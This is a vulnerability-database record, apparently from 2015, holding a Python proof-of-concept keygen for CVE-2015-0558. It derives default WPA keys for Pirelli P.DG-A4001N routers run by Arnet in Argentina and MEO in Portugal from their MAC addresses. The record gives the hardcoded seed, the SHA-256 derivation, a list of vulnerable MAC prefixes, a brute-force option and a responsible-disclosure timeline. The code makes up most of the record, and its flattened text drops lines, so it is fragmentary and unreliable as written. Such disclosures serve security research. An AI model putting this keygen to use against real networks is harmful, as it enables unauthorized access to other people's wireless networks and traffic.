{
    "text": "vul_name : Pirelli Router P.DG-A4001N WPA Key Reverse Engineering Rev 2 ， vul_cve : CVE-2015-0558 ， vul_poc :  #  ! /usr/bin/env python ，  # - * - coding : utf-8 - * - ， ' ，  @ license : GPLv3 ，  @ author : Eduardo Novella ，  @ contact : ednolo [ a ] inf.upv.es ，  @ twitter :  @ enovella_ ，  [  *  ] Target :  ， Vendor : ADB broadband Pirelli ， Router : Model P.DG-A4001N ， ISP : Arnet Telecom Argentina , MEO Portugal ， Possible-targets :  ， Firmware :  ( ARG )  ，  ( POR )  ，  [  *  ]  ，  [ 0 ]  [ AUSTRIA ] A1/Telekom Austria PRG EAV4202N Default WPA Key Algorithm Weakness ，  [ 1 ]  [ ITALY ] Alice AGPF : The algorithm !  ，  [ 2 ]  [ ARGENTINA ] CVE-2015-0558 : Reverse-engineering the default WPA key generation ， algorithm for Pirelli routers in Argentina ，  [ 3 ]  [ PORTUGAL ]  ，  [  *  ] Test vectors ARG :  ，  [  *  ] Acknowledgements :  ， -> Thanks to fernando3k for giving me the firmware in order to do reverse-engineering on it , and christian32 for showing me a bunch of test vectors. ， -> Thanks to Nicols Chaves for spotting a problem between WLAN , LAN mac addresses. ， -> Thanks to Kara Davis for working with me in Portugal Pirelli ，  [  *  ] Timeline :  ， ARGENTINA ， 2014-09-11 Found the algorithm ， 2014-09-12 Send a message to @ ArnetOnline via Twitter @ enovella_ ， 2014-09-15 Send a message via website , still looking for a simple mail (  ， 2014-09-16 Send another message to Arnet via website. First reply via twitter where they redirect me to the website form. ， 2014-09-19 Direct message via twitter. I talk with them about the critical vulnerability and offer them an email with PGP key ， 2014-09-20 More twitter PM about the same. They do not want to be aware about the problem though. ， 2014-09-23 I assume that Arnet does not care about its clients' security at all regarding its little interest. ， 2014-09-24 I send the problem to the vendor ADB Pirelli via website form ， 2014-09-28 I send the problem to the vendor ADB Pirelli via email to Switzerland ， 2015-01-05 Full disclosure and CVE-2015-0558 assigned ， PORTUGAL ， 2015-04-01 I receive an email confirming that the Portuguese ISP \"MEO\" uses the same algorithm ， 2015-04-05 Send a message to @ MEOpt via Twitter @ enovella_ ， 2015-04-05 I got response in matter of minutes \\o/ ， 2015-04-05 I send an email to luis-oliveira-cc @ telecom.pt , stating the reference 3-78405621289 in email subject ， 2015-05-07 Full disclosure ，  [  *  ] Changelog :  ， 2015-05-06 v1.4 Added MEO routers in Portugal. Essid ADSLPT-ABX ， 2015-02-01 v1.3 Final version , hopefully ， 2015-01-12 v1.2 Confusion between LAN and WLAN mac address ， 2015-01-10 v1.1 -allKeys flag added ， 2014-09-11 v1.0 First PoC working ， ' ， VERSION = 1 ， SUBVERSION = 4 ， DATEVERSION = '2015-05-06' ， URL = ' ， seed = ( '\\x64\\xC6\\xDD\\xE3\\xE5\\x79\\xB6\\xD9\\x86\\x96\\x8D\\x34\\x45\\xD2\\x3B\\x15' + ， '\\xCA\\xAF\\x12\\x84\\x02\\xAC\\x56\\x00\\x05\\xCE\\x20\\x75\\x91\\x3F\\xDC\\xE8' )  ， lookup = '0123456789abcdefghijklmnopqrstuvwxyz' ， sha256 = hashlib.sha256 (  )  ， sha256.update ( seed )  ， sha256.update ( '1236790' )  ， sha256.update ( mac )  ， digest = bytearray ( sha256.digest (  )  ， print \" [ + ] SHA256 : %s\" % sha256.hexdigest (  )  ， print \" [ + ] Possible vulnerable targets so far : \" ， print ( \"\\t bssid : {0 : s} : XX : XX : XX \\t essid : WiFi-Arnet-XX , ADSLPT-ABX\".format ( t.upper (  )  ， sys.exit (  )  ， supported = False ， supported = True ， print \" [  !  ] Your bssid looks like not supported ! Generating anyway.\" ， mac = bytearray.fromhex ( '%012x' % ( int ( mac_str , 16 ) + inc )  ， sys.exit ( ' [  !  ] Use real input :  ) ' )  ， global targets ， version = \" {0 : d}.{1 : d} [ {2 : s} ] -> {3 : s}\".format ( VERSION , SUBVERSION , DATEVERSION , URL )  ， targets = [ '00 : 08 : 27' , '00 : 13 : C8' , '00 : 17 : C2' , '00 : 19 : 3E' , '00 : 1C : A2' , '00 : 1D : 8B' , '00 : 22 : 33' , '00 : 8C : 54' ,  ， '30 : 39 : F2' , '74 : 88 : 8B' , '84 : 26 : 15' , 'A4 : 52 : 6F' , 'A4 : 5D : A1' , 'D0 : D4 : 12' , 'D4 : D1 : 84' , 'DC : 0B : 1A' , 'F0 : 84 : 2F' ]  ， parser = argparse.ArgumentParser ( description=' PoC WPA keygen for WiFi Networks deployed by Arnet in Argentina and ， MEO in Portugal. So far only WiFi networks with essids like WiFi-Arnet-XX ， or ADSLPT-ABX and manufactured by Pirelli are likely vulnerable. See ， email : ednolo [ at ] inf.upv.es. This software is used just as proof-of-concept ,  ， commit fraud depends on you ! ' ,  ， epilog=' ( + ) Help : python %s -b 74 : 88 : 8B : AD : C0 : DE ' % ( sys.argv [ 0 ]  )  ， maingroup = parser.add_argument_group ( title='required' )  ， maingroup.add_argument ( '-b' , '-bssid' , type=str , nargs='?' , help='Target mac address' )  ， parser.add_argument ( '-v' , '-version' , action='version' , version='% ( prog ) s'+version )  ， command_group = parser.add_mutually_exclusive_group (  )  ， command_group.add_argument ( '-l' , '-list' , help='List all vulnerable targets' , action='store_true' )  ， command_group.add_argument ( '-a' , '-allkeys' , help='Bruteforce mode' , action=\"store_true\" )  ， args = parser.parse_args (  )  ， printTargets (  )  ， elif args.bssid :  ， mac_str = re.sub ( r' [ ^a-fA-F0-9 ] ' , ' , args.bssid )  ， sys.exit ( ' [  !  ] Check MAC format ! \\n' )  ， checkTargets ( args.bssid )  ， print ' [ + ] MAC : %s' % args.bssid ， print '\\n [ + ] WPA keys for SSID : WiFi-Arnet-XX ( Argentina ) ' ， mac = addIncToMac ( mac_str , i )  ， print '%-10s' % ( genkey ( mac , False )  ， print '\\n [ + ] WPA keys for SSID : ADSLPT-ABX ( Portugal ) ' ， mac = addIncToMac ( mac_str , i )  ， print '%-10s' % ( genkey ( mac , False )  [  : 8 ]  )  ， wpa = genkey ( addIncToMac ( mac_str , 0 )  , False )  ， print ' [ + ] WPA key : %-10s\\t%-10s' % ( wpa , \"SSID : WiFi-Arnet-XX ( Argentina ) \" )  ， print ' [ + ] WPA key : %-10s\\t%-10s' % ( wpa [  : 8 ]  , \"SSID : ADSLPT-ABX ( Portugal ) \" )  ， sys.exit ( ' [  !  ] Are you trying to crash me? :  ) ' )  ， parser.print_help (  )  ， main (  ) ",
    "time": "2015.05.09"
}